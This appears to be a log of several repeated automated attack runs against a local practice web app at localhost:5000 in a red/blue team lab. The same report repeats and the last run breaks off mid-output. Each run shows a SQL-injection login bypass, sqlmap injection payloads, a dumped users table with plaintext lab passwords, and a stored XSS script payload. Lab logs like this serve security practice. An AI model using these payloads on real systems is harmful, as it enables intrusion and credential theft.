+Completed: 2026-09-19T08:23:57Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:25:25Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:25:25 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:25:25] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:25:25] [INFO] testing URL 'http://localhost:5000/login'
+[08:25:25] [INFO] resuming back-end DBMS 'sqlite' 
+[08:25:25] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0825am.csv' as the CSV results file in multiple targets mode
+[08:25:25] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:25:25] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:25:25] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:25:25] [INFO] fetching columns for table 'users' 
+[08:25:25] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:25:25] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:25:25] [INFO] fetching columns for table 'comments' 
+[08:25:25] [INFO] fetching entries for table 'comments'
+[08:25:25] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:25:25] [INFO] resumed: 0
+[08:25:25] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:25:25] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:25:25] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0825am.csv'
+
+[*] ending @ 08:25:25 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:25:25Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:26:23Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:26:23 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:26:23] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:26:23] [INFO] testing URL 'http://localhost:5000/login'
+[08:26:23] [INFO] resuming back-end DBMS 'sqlite' 
+[08:26:23] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0826am.csv' as the CSV results file in multiple targets mode
+[08:26:23] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:26:23] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:26:23] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:26:23] [INFO] fetching columns for table 'comments' 
+[08:26:23] [INFO] fetching entries for table 'comments'
+[08:26:23] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:26:23] [INFO] resumed: 0
+[08:26:23] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:26:23] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:26:23] [INFO] fetching columns for table 'users' 
+[08:26:23] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:26:23] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:26:23] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0826am.csv'
+
+[*] ending @ 08:26:23 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:26:23Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:28:33Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.8#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:28:33 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:28:33] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:28:33] [INFO] testing URL 'http://localhost:5000/login'
+[08:28:33] [INFO] resuming back-end DBMS 'sqlite' 
+[08:28:33] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0828am.csv' as the CSV results file in multiple targets mode
+[08:28:33] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:28:33] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:28:33] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:28:33] [INFO] fetching columns for table 'users' 
+[08:28:33] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:28:33] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:28:33] [INFO] fetching columns for table 'comments' 
+[08:28:33] [INFO] fetching entries for table 'comments'
+[08:28:33] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:28:33] [INFO] resumed: 0
+[08:28:33] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:28:33] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:28:33] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0828am.csv'
+
+[*] ending @ 08:28:33 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:28:33Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:31:09Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:31:10 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:31:10] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:31:10] [INFO] testing URL 'http://localhost:5000/login'
+[08:31:10] [INFO] resuming back-end DBMS 'sqlite' 
+[08:31:10] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0831am.csv' as the CSV results file in multiple targets mode
+[08:31:10] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:31:10] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:31:10] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:31:10] [INFO] fetching columns for table 'users' 
+[08:31:10] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:31:10] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:31:10] [INFO] fetching columns for table 'comments' 
+[08:31:10] [INFO] fetching entries for table 'comments'
+[08:31:10] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:31:10] [INFO] resumed: 0
+[08:31:10] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:31:10] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:31:10] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0831am.csv'
+
+[*] ending @ 08:31:10 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:31:10Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:33:04Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.8#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:33:04 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:33:04] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:33:04] [INFO] testing URL 'http://localhost:5000/login'
+[08:33:04] [INFO] resuming back-end DBMS 'sqlite' 
+[08:33:04] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0833am.csv' as the CSV results file in multiple targets mode
+[08:33:04] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:33:05] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:33:05] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:33:05] [INFO] fetching columns for table 'users' 
+[08:33:05] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:33:05] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:33:05] [INFO] fetching columns for table 'comments' 
+[08:33:05] [INFO] fetching entries for table 'comments'
+[08:33:05] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:33:05] [INFO] resumed: 0
+[08:33:05] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:33:05] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:33:05] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0833am.csv'
+
+[*] ending @ 08:33:05 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:33:05Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:35:00Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.8#stable}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:35:01 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:35:01] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:35:01] [INFO] testing URL 'http://localhost:5000/login'
+[08:35:01] [INFO] resuming back-end DBMS 'sqlite' 
+[08:35:01] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0835am.csv' as the CSV results file in multiple targets mode
+[08:35:01] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:35:01] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:35:01] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:35:01] [INFO] fetching columns for table 'comments' 
+[08:35:01] [INFO] fetching entries for table 'comments'
+[08:35:01] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:35:01] [INFO] resumed: 0
+[08:35:01] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:35:01] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:35:01] [INFO] fetching columns for table 'users' 
+[08:35:01] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:35:01] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:35:01] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0835am.csv'
+
+[*] ending @ 08:35:01 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:35:01Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:36:56Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.8#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:36:56 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:36:56] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:36:56] [INFO] testing URL 'http://localhost:5000/login'
+[08:36:56] [INFO] resuming back-end DBMS 'sqlite' 
+[08:36:56] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0836am.csv' as the CSV results file in multiple targets mode
+[08:36:56] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
